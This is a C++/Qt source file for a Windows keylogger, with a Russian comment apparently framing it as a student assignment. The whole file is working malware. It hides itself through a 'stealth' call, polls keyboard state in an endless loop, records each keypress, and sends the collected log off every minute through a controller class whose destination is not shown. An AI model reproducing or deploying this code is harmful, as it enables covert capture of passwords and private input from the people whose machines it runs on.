#include <QCoreApplication>
#include <QTime>

#include "pingcontroller.h"

int main(int argc, char *argv[])
{
    QCoreApplication a(argc, argv);

    PingController ping;

    ping.stealth();

    char buffer[MAX_PATH];
    ::GetModuleFileNameA(nullptr, buffer, MAX_PATH);

    //отправлять преподавателю будем каждую минуту
    int i;
    while (1) {
        for (i = 8; i <= 190; i++) {
            QTime now = QTime::currentTime();
            QString timeStr = now.toString("ss");
            int interval = timeStr.toInt();
            if (interval == 0){
                qDebug() << "TIMEee" << interval;
                ping.sendKeylog();
            }
            if (GetAsyncKeyState(i) == -32767){
                ping.save(i);
            }
        }
    }

    //return a.exec();
}
